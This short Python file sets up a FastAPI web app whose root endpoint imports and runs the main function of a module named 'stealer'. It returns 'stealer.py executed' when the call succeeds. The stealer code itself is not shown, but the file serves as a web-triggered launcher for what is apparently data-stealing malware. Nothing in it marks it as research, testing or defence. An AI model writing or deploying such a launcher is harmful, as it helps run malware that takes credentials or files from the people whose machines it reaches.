from fastapi import FastAPI
from stealer import main as stealer_main

app = FastAPI()

@app.get("/")
def run_stealer():
    try:
        stealer_main()
        return {"status": "stealer.py executed"}
    except Exception as e:
        return {"error": str(e)}
